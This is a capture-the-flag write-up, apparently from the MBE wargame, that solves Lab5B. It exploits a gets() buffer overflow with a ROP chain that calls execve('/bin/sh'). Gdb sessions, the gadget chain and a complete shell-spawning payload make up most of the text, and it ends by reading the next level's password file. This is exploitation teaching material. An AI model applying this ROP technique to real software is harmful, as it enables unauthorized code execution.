---
title: "Разбор Lab5B (средне)"
permalink: /writeups/mbe/lab5b/
excerpt: "Разбор Lab5B."
---

---
First, log into the Lab05 as **lab5B** (`lab5B:s0m3tim3s_r3t2libC_1s_3n0ugh`) and go to the challenges folder:

```shell
$ ssh lab5B@<VM_IP>
$ cd /levels/lab05/
```

Then, let's try to execute the program:

```bash
lab5B@warzone:/levels/lab05$ ./lab5B
Insert ROP chain here:
PLOP!
```

Like in the previous level, we need to write a ROP chain to exploit this binary.

## Анализ исходного кода

Let's check the source code:

```c
#include <stdlib.h>
#include <stdio.h>

/* gcc -fno-stack-protector --static -o lab5B lab5B.c */

int main()
{

    char buffer[128] = {0};

    printf("Insert ROP chain here:\n");
    gets(buffer);

    return EXIT_SUCCESS;
}
```

This time the **lbc** is not included in the binary, but we can use other ways to get code execution through ROP.

## Динамический анализ

First, let's do a bit of dynamic analysis in `gdb` and see if we can take control of the EIP, then we'll see if we can build a ROP chain. Here, we'll create a pattern and send it as input to the binary.

```nasm
$ gdb -q ./lab5B
Reading symbols from ./lab5B...(no debugging symbols found)...done.
gdb-peda$ pattern_create 180
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAA'
gdb-peda$ r < <(python -c "print('AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAA')")
Starting program: /levels/lab05/lab5B < <(python -c "print('AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAA')")
Insert ROP chain here:

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41415141 ('AQAA')
ECX: 0xfbad2088
EDX: 0x80ec4e0 --> 0x0
ESI: 0x0
EDI: 0x5241416d ('mAAR')
EBP: 0x416e4141 ('AAnA')
ESP: 0xbffff6d0 ("oAATAApAAUAAqAAVAArAAWAAsAA")
EIP: 0x41415341 ('ASAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41415341
[------------------------------------stack-------------------------------------]
0000| 0xbffff6d0 ("oAATAApAAUAAqAAVAArAAWAAsAA")
0004| 0xbffff6d4 ("AApAAUAAqAAVAArAAWAAsAA")
0008| 0xbffff6d8 ("AUAAqAAVAArAAWAAsAA")
0012| 0xbffff6dc ("qAAVAArAAWAAsAA")
0016| 0xbffff6e0 ("AArAAWAAsAA")
0020| 0xbffff6e4 ("AWAAsAA")
0024| 0xbffff6e8 --> 0x414173 ('sAA')
0028| 0xbffff6ec --> 0x80eb00c --> 0x8067b30 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41415341 in ?? ()
```

Nice, now let's check wich part of the pattern is in EIP.

```nasm
gdb-peda$ pattern_search
Registers contain pattern buffer:
EIP+0 found at offset: 149
EBX+0 found at offset: 137
EDI+0 found at offset: 141
EBP+0 found at offset: 13
Registers point to pattern buffer:
[ESP] --> offset 153 - size ~27
Pattern buffer found at:
0xb7ffb00a : offset   19 - size  161 (mapped)
0xbffff64a : offset   19 - size  161 ($sp + -0x86 [-34 dwords])
Reference to pattern buffer not found in memory
```

It seems that we need to write **149** bytes before overwriting the *EIP*.

```nasm
gdb-peda$ r < <(python -c "print('A' * 149 + 'BBBB' + 27 * 'C')")
Starting program: /levels/lab05/lab5B < <(python -c "print('A' * 149 + 'BBBB' + 27 * 'C')")
Insert ROP chain here:

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088
EDX: 0x80ec4e0 --> 0x0
ESI: 0x0
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6d0 ("AAAAABBBB", 'C' <repeats 27 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff6d0 ("AAAAABBBB", 'C' <repeats 27 times>)
0004| 0xbffff6d4 ("ABBBB", 'C' <repeats 27 times>)
0008| 0xbffff6d8 ("B", 'C' <repeats 27 times>)
0012| 0xbffff6dc ('C' <repeats 24 times>)
0016| 0xbffff6e0 ('C' <repeats 20 times>)
0020| 0xbffff6e4 ('C' <repeats 16 times>)
0024| 0xbffff6e8 ('C' <repeats 12 times>)
0028| 0xbffff6ec ("CCCCCCCC")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Maybe not... Let's check the stack to see where our problem is.

```nasm
gdb-peda$ x/16wx $esp
0xbffff6d0: 0x41414141  0x42424241  0x43434342  0x43434343
0xbffff6e0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbffff6f0: 0x43434343  0x62954500  0x9458d499  0x00000000
0xbffff700: 0x00000000  0x00000000  0x00000000  0x00000000
```

We just wrote too many bytes, we are off by **9** bytes. Let's fix this.

```nasm
gdb-peda$ r < <(python -c "print('A' * 140 + 'BBBB' + 27 * 'C')")
Starting program: /levels/lab05/lab5B < <(python -c "print('A' * 140 + 'BBBB' + 27 * 'C')")
Insert ROP chain here:

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088
EDX: 0x80ec4e0 --> 0x0
ESI: 0x0
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6d0 ('C' <repeats 27 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff6d0 ('C' <repeats 27 times>)
0004| 0xbffff6d4 ('C' <repeats 23 times>)
0008| 0xbffff6d8 ('C' <repeats 19 times>)
0012| 0xbffff6dc ('C' <repeats 15 times>)
0016| 0xbffff6e0 ('C' <repeats 11 times>)
0020| 0xbffff6e4 ("CCCCCCC")
0024| 0xbffff6e8 --> 0x434343 ('CCC')
0028| 0xbffff6ec --> 0x80eb00c --> 0x8067b30 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
Ok, fixed. 

## ROP-цепочка

Now, we need to create our ROP chain. Basically, we can do something like this `execve("/bin/sh/", 0, 0);` using the [syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) **11** (or `0xb` in hexadecimal). It could look like this, but it will depend on the gadgets we will find in the executable:

```nasm
xor eax, eax
xor ecx, ecx
xor ebx, ebx
mov eax, 0x0b
mov ebx, <ptr to "/bin/sh">
int 0x80
```

Sadly, we don't have any reference to "/bin/bash" or "/bib/sh" in the binary.

```bash
$ gdb -q ./lab5B
Reading symbols from ./lab5B...(no debugging symbols found)...done.
gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Not found
gdb-peda$ searchmem "/bin/bash"
Searching for '/bin/bash' in: None ranges
Not found
```

But we can put it on the stack ourselves.

```nasm
gdb-peda$ r < <(python -c "print(140 * 'A' + 'BBBB' + '/bin/sh')")
Starting program: /levels/lab05/lab5B < <(python -c "print(140 * 'A' + 'BBBB' + '/bin/sh')")
Insert ROP chain here:

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088
EDX: 0x80ec4e0 --> 0x0
ESI: 0x0
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6d0 ("/bin/sh")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff6d0 ("/bin/sh")
0004| 0xbffff6d4 --> 0x68732f ('/sh')
0008| 0xbffff6d8 --> 0xbffff75c --> 0xbffff89c ("XDG_SESSION_ID=15")
0012| 0xbffff6dc --> 0x0
0016| 0xbffff6e0 --> 0x0
0020| 0xbffff6e4 --> 0x80481a8 (<_init>:    push   ebx)
0024| 0xbffff6e8 --> 0x0
0028| 0xbffff6ec --> 0x80eb00c --> 0x8067b30 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Nice, "/bin/sh" is now on the stack. Now, using `ropgadget` we can start looking for interesting *gadget*. After a few try, I came up with the following ROP chain

```nasm
0x080bbf26 ; pop eax ; ret
0x0000000b ; EAX = 0x0b (syscall for execve())
0x080e55ad ; pop ecx ; ret
0x00000000 ; ECX = 0
0x080481c9 : pop ebx ; ret
0xbffff6e8 ; PTR to "/bin/sh" in EBX
0x08049401 ; int 0x80
```

If we set a breakpoint on the `ret` instruction in the *main()* function, we can see our ROP chain on the stack.

```nasm
gdb-peda$ break *main+69
Breakpoint 1 at 0x8048e89
gdb-peda$ r < <(python -c "print(140 * 'A' + '\x26\xbf\x0b\x08' + '\x0b\x00\x00\x00' + '\xad\x55\x0e\x08' + '\x00\x00\x00\x00' + '\xc9\x81\x04\x08' + '\xe8\xf6\xff\xbf' + '\x01\x94\x04\x08' + '/bin/sh')")
Starting program: /levels/lab05/lab5B < <(python -c "print(140 * 'A' + '\x26\xbf\x0b\x08' + '\x0b\x00\x00\x00' + '\xad\x55\x0e\x08' + '\x00\x00\x00\x00' + '\xc9\x81\x04\x08' + '\xe8\xf6\xff\xbf' + '\x01\x94\x04\x08' + '/bin/sh')")
Insert ROP chain here:
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088
EDX: 0x80ec4e0 --> 0x0
ESI: 0x0
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff6cc --> 0x80bbf26 (<_Unwind_GetDataRelBase+6>:  pop    eax)
EIP: 0x8048e89 (<main+69>:  ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048e86 <main+66>: pop    ebx
   0x8048e87 <main+67>: pop    edi
   0x8048e88 <main+68>: pop    ebp
=> 0x8048e89 <main+69>: ret
   0x8048e8a:   xchg   ax,ax
   0x8048e8c:   xchg   ax,ax
   0x8048e8e:   xchg   ax,ax
   0x8048e90 <__libc_start_main>:   push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x80bbf26 (<_Unwind_GetDataRelBase+6>: pop    eax)
0004| 0xbffff6d0 --> 0xb ('\x0b')
0008| 0xbffff6d4 --> 0x80e55ad --> 0x40ec359
0012| 0xbffff6d8 --> 0x0
0016| 0xbffff6dc --> 0x80481c9 (<_init+33>: pop    ebx)
0020| 0xbffff6e0 --> 0xbffff6e8 ("/bin/sh")
0024| 0xbffff6e4 --> 0x8049401 (<__libc_setup_tls+321>: int    0x80)
0028| 0xbffff6e8 ("/bin/sh")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048e89 in main ()
```

And if we continue the execution, we should get a shell.

```nasm
gdb-peda$ conti
Continuing.
process 6298 is executing new program: /bin/dash
```

Nice!

## Решение

As we are using a stack address pointing to "/bin/sh", like in the previous levels, we will need to adjust the address. Here, it seems that removing **40 bytes** from `0xbffff6e8` did the trick.

```shell
lab5B@warzone:/levels/lab05$ (python -c "print(140 * 'A' + '\x26\xbf\x0b\x08' + '\x0b\x00\x00\x00' + '\xad\x55\x0e\x08' + '\x00\x00\x00\x00' + '\xc9\x81\x04\x08' + '\xa8\xf6\xff\xbf' + '\x01\x94\x04\x08' + '/bin/sh')"; cat -) | ./lab5B
Insert ROP chain here:

whoami
lab5A
cat /home/lab5A/.pass
th4ts_th3_r0p_i_lik3_2_s33
```

Awesome! You can go to the last [challenge](/writeups/mbe/lab5a/).
